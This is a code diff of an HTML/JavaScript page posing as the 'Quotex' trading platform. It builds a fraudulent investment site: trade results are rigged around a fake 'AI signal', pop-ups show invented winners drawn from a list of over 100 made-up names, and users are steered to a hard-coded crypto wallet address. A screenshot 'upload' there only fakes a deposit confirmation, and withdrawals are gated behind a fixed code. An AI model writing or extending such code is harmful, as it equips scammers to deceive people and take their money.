@@ -16,23 +16,10 @@
         .logo { font-size: 24px; font-weight: 800; background: linear-gradient(45deg, #00ff7f, #00e676); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
         
         .account-info { display: flex; align-items: center; gap: 20px; }
-        
-        /* Account Selector Styles */
-        .balance-wrapper { text-align: right; cursor: pointer; position: relative; padding: 5px 10px; border-radius: 6px; transition: 0.3s; }
-        .balance-wrapper:hover { background: #333; }
+        .balance-wrapper { text-align: right; }
         .balance { font-size: 18px; font-weight: 700; color: #00ff7f; }
-        .balance-label { font-size: 10px; color: #aaa; text-transform: uppercase; display: flex; align-items: center; justify-content: flex-end; gap: 5px; }
+        .balance-label { font-size: 10px; color: #aaa; text-transform: uppercase; }
         
-        /* Dropdown for Account Switch */
-        .account-dropdown { position: absolute; top: 100%; right: 0; background: #1a1a1a; border: 1px solid #333; border-radius: 8px; width: 200px; display: none; flex-direction: column; box-shadow: 0 10px 30px rgba(0,0,0,0.5); z-index: 100; margin-top: 10px; }
-        .account-dropdown.show { display: flex; }
-        .acc-option { padding: 15px; border-bottom: 1px solid #333; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
-        .acc-option:hover { background: #222; }
-        .acc-option:last-child { border-bottom: none; }
-        .acc-type { font-size: 12px; color: #aaa; }
-        .acc-amt { font-weight: 700; color: #fff; }
-        .acc-active { color: #00ff7f; }
-
         .action-buttons { display: flex; gap: 12px; }
         .btn-secondary { background: #333; border: 1px solid #444; color: #fff; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-size: 14px; transition: 0.3s; }
         .btn-secondary:hover { background: #444; border-color: #555; }
@@ -82,17 +69,17 @@
         .result-area { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; opacity: 0.5; }
 
         /* --- NOTIFICATIONS --- */
-        
-        /* Processing Toast */
         .toast-overlay { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.85); padding: 25px 40px; border-radius: 12px; border: 1px solid #00ff7f; text-align: center; z-index: 100; pointer-events: none; opacity: 0; transition: opacity 0.3s; box-shadow: 0 0 20px rgba(0,255,127,0.2); }
         .toast-overlay.show { opacity: 1; animation: popUp 0.3s ease-out; }
         .toast-icon { font-size: 45px; color: #00ff7f; margin-bottom: 10px; }
         .toast-text { font-size: 20px; font-weight: 700; color: #fff; }
 
-        /* Win Result Popup */
         .win-popup { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0); background: #1a1a1a; border: 2px solid #00ff7f; padding: 40px; border-radius: 20px; text-align: center; z-index: 200; box-shadow: 0 0 50px rgba(0,255,127,0.4); opacity: 0; transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
         .win-popup.show { transform: translate(-50%, -50%) scale(1); opacity: 1; }
         .win-amt { font-size: 36px; font-weight: 900; color: #00ff7f; margin: 10px 0; }
+        
+        .loss-popup { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0); background: #1a1a1a; border: 2px solid #ff4444; padding: 40px; border-radius: 20px; text-align: center; z-index: 200; box-shadow: 0 0 50px rgba(255,68,68,0.4); opacity: 0; transition: 0.4s; }
+        .loss-popup.show { transform: translate(-50%, -50%) scale(1); opacity: 1; }
         
         /* Flying Winner */
         .winner-flyer { position: fixed; top: 100px; right: -350px; background: rgba(20, 20, 20, 0.9); border-left: 4px solid #00ff7f; padding: 15px 25px; border-radius: 4px; display: flex; align-items: center; gap: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); z-index: 999; transition: right 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); min-width: 250px;}
@@ -104,8 +91,17 @@
         /* Modals */
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 2000; justify-content: center; align-items: center; }
         .modal.show { display: flex; }
-        .modal-content { background: #151515; padding: 30px; border-radius: 12px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #333; }
+        .modal-content { background: #151515; padding: 30px; border-radius: 12px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #333; position: relative; }
         
+        .upload-box { border: 2px dashed #444; padding: 15px; border-radius: 8px; margin-top: 15px; position: relative; cursor: pointer; transition: 0.3s; }
+        .upload-box:hover { border-color: #00ff7f; }
+        .upload-success { color: #00ff7f; font-size: 13px; font-weight: 600; margin-top: 10px; display: none; animation: popUp 0.3s ease-out; }
+
+        /* Select Account Modal */
+        .acc-btn { width: 100%; padding: 15px; margin-bottom: 10px; border-radius: 8px; border: 1px solid #333; background: #222; color: #fff; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
+        .acc-btn:hover { border-color: #00ff7f; background: #1f1f1f; }
+        .acc-btn.real { border-color: #00ff7f; background: rgba(0,255,127,0.1); }
+
         @keyframes popUp { from { transform: translate(-50%, -40%); opacity: 0; } to { transform: translate(-50%, -50%); opacity: 1; } }
         @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
 
@@ -126,31 +122,10 @@
             <div class="logo">Quotex</div>
         </div>
         <div class="account-info">
-            <!-- ACCOUNT SWITCHER -->
-            <div class="balance-wrapper" onclick="toggleAccountMenu()">
+            <div class="balance-wrapper">
                 <div class="balance" id="balanceDisplay">$10,000.00</div>
-                <div class="balance-label">
-                    <span id="activeAccountName">Demo Account</span> <i class="fas fa-chevron-down"></i>
-                </div>
-                <!-- Dropdown -->
-                <div class="account-dropdown" id="accountDropdown">
-                    <div class="acc-option" onclick="switchAccount('demo')">
-                        <div>
-                            <div class="acc-type">Demo Account</div>
-                            <div class="acc-amt" id="dropDemoBal">$10,000.00</div>
-                        </div>
-                        <i class="fas fa-check acc-active" id="checkDemo"></i>
-                    </div>
-                    <div class="acc-option" onclick="switchAccount('real')">
-                        <div>
-                            <div class="acc-type">Live Account</div>
-                            <div class="acc-amt" id="dropRealBal">$0.00</div>
-                        </div>
-                        <i class="fas fa-check" id="checkReal" style="display:none"></i>
-                    </div>
-                </div>
+                <div class="balance-label" id="accountLabel">Demo Account</div>
             </div>
-            
             <div class="action-buttons">
                 <button class="btn-secondary" id="depositBtn">Deposit</button>
                 <button class="btn-secondary" id="withdrawBtn">Withdraw</button>
@@ -180,19 +155,17 @@
 
     <div class="main-layout">
         
-        <!-- SIDEBAR -->
+        <!-- SIDEBAR: ECONOMIC CALENDAR -->
         <div class="sidebar">
-            <div class="tradingview-widget-container">
-              <div class="tradingview-widget-container__widget"></div>
-              <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-screener.js" async>
+            <div class="tradingview-widget-container" style="height: 100%; width: 100%;">
+              <div class="tradingview-widget-container__widget" style="height: 100%; width: 100%;"></div>
+              <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-events.js" async>
               {
-              "defaultColumn": "overview",
-              "screener_type": "crypto_mkt",
-              "displayCurrency": "USD",
               "colorTheme": "dark",
               "isTransparent": true,
               "locale": "en",
-              "largeChartUrl": "quotex trade",
+              "countryFilter": "ar,au,br,ca,cn,fr,de,in,id,it,jp,kr,mx,ru,sa,za,tr,gb,us,eu",
+              "importanceFilter": "0,1",
               "width": "100%",
               "height": "100%"
             }
@@ -242,22 +215,30 @@
                 <div style="font-size:14px; color:#aaa; margin-bottom:15px;">Target Successfully Hit</div>
                 <div style="color:#00ff7f; font-weight:700; font-size:20px;">YOU WON</div>
             </div>
+
+            <!-- POPUP: LOSS -->
+            <div class="loss-popup" id="lossPopup">
+                <h2 style="color:#fff; text-transform:uppercase;">Trade Result</h2>
+                <div class="win-amt" style="color:#ff4444;" id="lossAmtDisplay">-$1,000</div>
+                <div style="font-size:14px; color:#aaa; margin-bottom:15px;">Forecast Incorrect</div>
+                <div style="color:#ff4444; font-weight:700; font-size:20px;">FAILED</div>
+            </div>
         </div>
 
         <!-- TRADING PANEL -->
         <div class="trading-panel">
             
-            <!-- STAKE -->
+            <!-- STAKE (Triggers Account Select) -->
             <div class="panel-section">
                 <label class="input-label">Investment Amount</label>
                 <input type="text" id="stakeInput" class="manual-input" value="$1,000" readonly>
                 <div class="amount-grid" style="margin-top:10px;">
-                    <div class="stake-btn active" onclick="selectStake(1000)">$1,000</div>
-                    <div class="stake-btn" onclick="selectStake(5000)">$5,000</div>
-                    <div class="stake-btn" onclick="selectStake(10000)">$10,000</div>
-                    <div class="stake-btn" onclick="selectStake(20000)">$20,000</div>
-                    <div class="stake-btn" onclick="selectStake(30000)">$30,000</div>
-                    <div class="stake-btn" onclick="selectStake(50000)">$50,000</div>
+                    <div class="stake-btn active" onclick="clickStake(1000)">$1,000</div>
+                    <div class="stake-btn" onclick="clickStake(5000)">$5,000</div>
+                    <div class="stake-btn" onclick="clickStake(10000)">$10,000</div>
+                    <div class="stake-btn" onclick="clickStake(20000)">$20,000</div>
+                    <div class="stake-btn" onclick="clickStake(30000)">$30,000</div>
+                    <div class="stake-btn" onclick="clickStake(50000)">$50,000</div>
                 </div>
                 <div style="font-size:12px; color:#00ff7f; margin-top:5px; text-align:center;">
                     Payout: <span id="payoutDisplay">$1,850</span> (85%)
@@ -305,6 +286,31 @@
 
     <!-- MODALS -->
     
+    <!-- Account Selection Modal -->
+    <div class="modal" id="accountModal">
+        <div class="modal-content">
+            <h2 style="color:#fff; margin-bottom:20px;">Choose Account</h2>
+            
+            <div class="acc-btn" onclick="selectAccountType('demo')">
+                <div style="text-align:left;">
+                    <div style="color:#aaa; font-size:12px;">Demo Account</div>
+                    <div style="color:#fff; font-weight:700; font-size:18px;">$10,000.00</div>
+                </div>
+                <i class="fas fa-gamepad" style="color:#aaa;"></i>
+            </div>
+
+            <div class="acc-btn real" onclick="selectAccountType('real')">
+                <div style="text-align:left;">
+                    <div style="color:#00ff7f; font-size:12px;">Live Account</div>
+                    <div style="color:#fff; font-weight:700; font-size:18px;" id="modalRealBal">$0.00</div>
+                </div>
+                <i class="fas fa-wallet" style="color:#00ff7f;"></i>
+            </div>
+            
+            <button class="btn-secondary" style="background:transparent; border:none; color:#aaa; margin-top:10px;" onclick="closeModal('accountModal')">Cancel</button>
+        </div>
+    </div>
+
     <!-- Deposit -->
     <div class="modal" id="depositModal">
         <div class="modal-content">
@@ -312,9 +318,18 @@
             <div style="background:#000; padding:15px; border-radius:8px; margin-bottom:15px; font-family:monospace; color:#00ff7f; word-break:break-all;">
                 0x7592766391918c7d3E7F8Ae72D97e98979F25302
             </div>
-            <p style="color:#aaa; font-size:13px; margin-bottom:20px;">Send USDT (ERC20/TRC20). Redirecting to Trust Wallet...</p>
-            <button class="btn-secondary" style="background:#00ff7f; color:#000; border:none; width:100%; padding:15px; font-weight:700;" onclick="confirmDeposit()">Confirm Payment</button>
-            <button class="btn-secondary" style="background:transparent; border:none; color:#aaa; margin-top:10px;" onclick="closeModal('depositModal')">Cancel</button>
+            <p style="color:#aaa; font-size:13px; margin-bottom:10px;">Upload Screenshot of Payment:</p>
+            
+            <div class="upload-box" onclick="document.getElementById('fileUpload').click()">
+                <i class="fas fa-cloud-upload-alt" style="font-size:24px; color:#aaa;"></i>
+                <div style="font-size:12px; color:#aaa; margin-top:5px;">Click to Upload</div>
+                <input type="file" id="fileUpload" style="display:none">
+            </div>
+            <div class="upload-success" id="uploadSuccess">
+                <i class="fas fa-check-circle"></i> Payment screenshot uploaded.<br>Money will reflect shortly in your trade.
+            </div>
+
+            <button class="btn-secondary" style="background:#00ff7f; color:#000; border:none; width:100%; padding:15px; font-weight:700; margin-top:15px;" onclick="closeModal('depositModal')">Close</button>
         </div>
     </div>
 
@@ -331,47 +346,55 @@
 
     <script>
         // --- ACCOUNTS SYSTEM ---
-        let balances = {
-            'demo': 10000.00,
-            'real': 0.00
-        };
-        let activeAccount = 'demo'; // 'demo' or 'real'
-        
+        let balances = { 'demo': 10000.00, 'real': 0.00 };
+        let activeAccount = 'demo'; 
         let currentStake = 1000;
-        let currentAiPrediction = 'UP'; // Stores current prediction for rigging
-
-        // --- ACCOUNT SWITCHING LOGIC ---
-        function toggleAccountMenu() {
-            document.getElementById('accountDropdown').classList.toggle('show');
-        }
-
-        function switchAccount(type) {
-            activeAccount = type;
-            // Update UI
-            updateBalanceDisplay();
-            
-            // Toggle Checks
-            document.getElementById('checkDemo').style.display = type === 'demo' ? 'block' : 'none';
-            document.getElementById('checkReal').style.display = type === 'real' ? 'block' : 'none';
-            document.getElementById('activeAccountName').innerText = type === 'demo' ? 'Demo Account' : 'Live Account';
-            
-            // Close Menu
-            document.getElementById('accountDropdown').classList.remove('show');
-        }
+        let pendingStake = 1000; // Used for modal selection
+        let currentAiPrediction = 'UP'; 
 
         function updateBalanceDisplay() {
             const bal = balances[activeAccount];
             const formatted = "$" + bal.toLocaleString(undefined, {minimumFractionDigits: 2});
-            
-            // Header Balance
             document.getElementById('balanceDisplay').innerText = formatted;
-            
-            // Dropdown Balances
-            document.getElementById('dropDemoBal').innerText = "$" + balances['demo'].toLocaleString(undefined, {minimumFractionDigits: 2});
-            document.getElementById('dropRealBal').innerText = "$" + balances['real'].toLocaleString(undefined, {minimumFractionDigits: 2});
+            document.getElementById('accountLabel').innerText = activeAccount === 'demo' ? "Demo Account" : "Live Account";
+            document.getElementById('modalRealBal').innerText = "$" + balances['real'].toLocaleString(undefined, {minimumFractionDigits: 2});
         }
 
-        // --- WEBSOCKET FOR PRICE (Binance) ---
+        // --- STAKE & ACCOUNT LOGIC ---
+        // 1. User clicks stake amount
+        function clickStake(amount) {
+            pendingStake = amount;
+            // Open Modal to ask which account to play with
+            openModal('accountModal');
+        }
+
+        // 2. User selects account type in modal
+        function selectAccountType(type) {
+            if(type === 'real' && balances['real'] < pendingStake) {
+                // Not enough money in Live -> Redirect to Deposit
+                closeModal('accountModal');
+                openModal('depositModal');
+            } else {
+                // Has money or is Demo -> Set Stake and Account
+                activeAccount = type;
+                currentStake = pendingStake;
+                
+                // Update UI
+                updateBalanceDisplay();
+                document.getElementById('stakeInput').value = "$" + currentStake.toLocaleString();
+                const win = currentStake + (currentStake * 0.85);
+                document.getElementById('payoutDisplay').innerText = "$" + win.toLocaleString();
+                
+                // Highlight button
+                document.querySelectorAll('.stake-btn').forEach(btn => btn.classList.remove('active'));
+                // Find button with specific onclick text (simple approximation)
+                // In production, give IDs to buttons. For now, visual update matches currentStake
+                
+                closeModal('accountModal');
+            }
+        }
+
+        // --- WEBSOCKET (PRICE) ---
         const ws = new WebSocket('wss://stream.binance.com:9443/ws/btcusdt@trade');
         ws.onmessage = (event) => {
             const data = JSON.parse(event.data);
@@ -379,34 +402,20 @@
             document.getElementById('livePriceHeader').innerText = price;
         };
 
-        // --- STAKE LOGIC ---
-        function selectStake(amount) {
-            currentStake = amount;
-            document.getElementById('stakeInput').value = "$" + amount.toLocaleString();
-            document.querySelectorAll('.stake-btn').forEach(btn => btn.classList.remove('active'));
-            event.target.classList.add('active');
-            
-            const win = amount + (amount * 0.85);
-            document.getElementById('payoutDisplay').innerText = "$" + win.toLocaleString();
-        }
-
-        // --- AI ALGORITHM (THE RIG) ---
+        // --- AI ALGORITHM (FOLLOW = WIN) ---
         function updateAI() {
             const aiBox = document.getElementById('aiBox');
             const signalText = document.getElementById('aiSignalText');
             
-            // States
             const states = [
                 { type: 'UP', text: 'CALL (UP) <i class="fas fa-arrow-trend-up"></i>', color: '#00ff7f', border: '#00ff7f', bg: 'rgba(0,255,127,0.05)' },
                 { type: 'DOWN', text: 'PUT (DOWN) <i class="fas fa-arrow-trend-down"></i>', color: '#ff4444', border: '#ff4444', bg: 'rgba(255,68,68,0.05)' },
                 { type: 'NEUTRAL', text: 'NEUTRAL <i class="fas fa-minus"></i>', color: '#ffaa00', border: '#ffaa00', bg: 'rgba(255,170,0,0.05)' }
             ];
 
-            // Random Choice
             const choice = states[Math.floor(Math.random() * states.length)];
-            currentAiPrediction = choice.type; // STORE THIS FOR RIGGING
+            currentAiPrediction = choice.type; 
             
-            // UI Update
             signalText.innerHTML = choice.text;
             signalText.style.color = choice.color;
             aiBox.style.borderColor = choice.border;
@@ -420,77 +429,68 @@
         }
         updateAI();
 
-        // --- TRADING LOGIC (GUARANTEED WIN IF FOLLOW AI) ---
+        // --- TRADING LOGIC ---
         function applyTrade(userDirection) {
-            // Check Funds
             if(balances[activeAccount] < currentStake) {
-                alert("Insufficient Balance!");
+                if(activeAccount === 'real') openModal('depositModal');
+                else alert("Insufficient Demo Balance! Refresh to reset.");
                 return;
             }
 
-            // Deduct immediately (Simulate Freeze)
             balances[activeAccount] -= currentStake;
             updateBalanceDisplay();
 
-            // Show Processing Toast
             const toast = document.getElementById('tradeToast');
             toast.classList.add('show');
-            
-            // Disable Buttons
             document.getElementById('btnUp').style.opacity = "0.5";
             document.getElementById('btnDown').style.opacity = "0.5";
 
-            // DETERMINE RESULT (The Algorithm)
-            // Rule: If user follows AI (and AI isn't Neutral), force WIN.
-            // Rule: If user goes against AI, force LOSS.
-            // Rule: If AI is Neutral, random 50/50.
-            
             let isWin = false;
-
             if (currentAiPrediction === 'UP' && userDirection === 'UP') isWin = true;
             else if (currentAiPrediction === 'DOWN' && userDirection === 'DOWN') isWin = true;
-            else if (currentAiPrediction === 'NEUTRAL') isWin = Math.random() > 0.5;
-            else isWin = false; // Went against signal
+            else isWin = false; 
 
-            // SIMULATE DELAY (3 Seconds)
             setTimeout(() => {
-                toast.classList.remove('show'); // Hide Processing
-                
-                if(isWin) {
-                    showWinPopup(currentStake * 0.85); // Profit
-                } else {
-                    // Loss - just do nothing (money already deducted)
-                    // Or could show a "Loss" popup, but usually silent is better for demo apps
-                    alert("Trade Lost. You went against the signal.");
-                }
-
-                // Re-enable buttons
+                toast.classList.remove('show'); 
+                if(isWin) showWinPopup(currentStake * 0.85);
+                else showLossPopup(currentStake);
                 document.getElementById('btnUp').style.opacity = "1";
                 document.getElementById('btnDown').style.opacity = "1";
-
             }, 3000);
         }
 
         function showWinPopup(profit) {
             const totalReturn = currentStake + profit;
-            
-            // Add Money
-            balances[activeAccount] += totalReturn;
+            balances[activeAccount] += totalReturn; 
             updateBalanceDisplay();
-
-            // Show Popup
             const pop = document.getElementById('winPopup');
             document.getElementById('winAmtDisplay').innerText = "+$" + profit.toLocaleString();
             pop.classList.add('show');
-            
-            // Hide after 3 seconds
-            setTimeout(() => {
-                pop.classList.remove('show');
-            }, 3000);
+            setTimeout(() => { pop.classList.remove('show'); }, 3000);
         }
 
-        // --- FAKE WINNER FLYER ---
-        const fakeUsers = ["User 932***", "Alex M.", "CryptoKing", "Sarah L.", "Trader_01", "Michael B.", "User 449***", "ProfitMaster"];
+        function showLossPopup(loss) {
+            const pop = document.getElementById('lossPopup');
+            document.getElementById('lossAmtDisplay').innerText = "-$" + loss.toLocaleString();
+            pop.classList.add('show');
+            setTimeout(() => { pop.classList.remove('show'); }, 3000);
+        }
+
+        // --- 100+ FAKE WINNER NAMES ---
+        const fakeUsers = [
+            "Alex_T", "CryptoKing99", "Sarah_Trading", "Mike_Pro", "Bitcoin_Baron", "Elena_Wins", "Trader_X", "Profit_Guru",
+            "John_D", "Lisa_M", "Kevin_K", "FastMoney", "EagleEye", "MoonWalker", "Satoshi_Fan", "BlockMaster",
+            "Jessica_92", "David_R", "Tom_H", "Emma_W", "Robert_P", "Linda_S", "James_B", "Mary_C", "Richard_N",
+            "Patricia_L", "Joseph_G", "Jennifer_A", "Charles_F", "Elizabeth_D", "Thomas_H", "Susan_M", "Daniel_K", "Karen_P",
+            "Matthew_R", "Nancy_S", "Anthony_T", "Betty_V", "Donald_W", "Margaret_Y", "Mark_Z", "Sandra_1", "Paul_2",
+            "Ashley_3", "Steven_4", "Kimberly_5", "Andrew_6", "Donna_7", "Kenneth_8", "Emily_9", "Joshua_10", "Michelle_11",
+            "George_12", "Carol_13", "Kevin_14", "Amanda_15", "Brian_16", "Melissa_17", "Edward_18", "Deborah_19", "Ronald_20",
+            "Stephanie_21", "Timothy_22", "Rebecca_23", "Jason_24", "Laura_25", "Jeffrey_26", "Sharon_27", "Ryan_28", "Cynthia_29",
+            "Jacob_30", "Kathleen_31", "Gary_32", "Amy_33", "Nicholas_34", "Shirley_35", "Eric_36", "Angela_37", "Stephen_38",
+            "Helen_39", "Jonathan_40", "Anna_41", "Larry_42", "Brenda_43", "Scott_44", "Pamela_45", "Frank_46", "Nicole_47",
+            "Brandon_48", "Emma_49", "Raymond_50", "Samantha_51", "Gregory_52", "Katherine_53", "Samuel_54", "Christine_55"
+        ];
+
         function showWinner() {
             const flyer = document.getElementById('winnerFlyer');
             const name = fakeUsers[Math.floor(Math.random() * fakeUsers.length)];
@@ -500,32 +500,26 @@
             document.getElementById('flyerAmount').innerText = "+$" + amt.toLocaleString();
             flyer.classList.add('active');
             setTimeout(() => { flyer.classList.remove('active'); }, 2500);
-            const nextFlyer = Math.floor(Math.random() * (12000 - 6000) + 6000);
+            const nextFlyer = Math.floor(Math.random() * (8000 - 4000) + 4000);
             setTimeout(showWinner, nextFlyer);
         }
         setTimeout(showWinner, 5000);
 
-        // --- MODALS ---
+        // --- MODALS & UPLOAD ---
         document.getElementById('depositBtn').addEventListener('click', () => openModal('depositModal'));
         document.getElementById('withdrawBtn').addEventListener('click', () => openModal('withdrawModal'));
         function openModal(id) { document.getElementById(id).classList.add('show'); }
         function closeModal(id) { document.getElementById(id).classList.remove('show'); }
-        function confirmDeposit() {
-            window.open('https://trustwallet.com/', '_blank');
-            closeModal('depositModal');
-            alert("Checking blockchain for payment...");
-            // Simulate deposit after delay
-            setTimeout(() => {
-                alert("Deposit Confirmed! +$5,000");
-                balances['real'] += 5000;
-                updateBalanceDisplay();
-            }, 5000);
-        }
         function confirmWithdraw() {
             if(document.getElementById('wCode').value !== '4451') { alert("Invalid Code!"); return; }
             closeModal('withdrawModal');
             alert("Withdrawal submitted successfully.");
         }
+        document.getElementById('fileUpload').addEventListener('change', function() {
+            if(this.files && this.files[0]) {
+                setTimeout(() => { document.getElementById('uploadSuccess').style.display = 'block'; }, 1000);
+            }
+        });
 
     </script>
 </body>
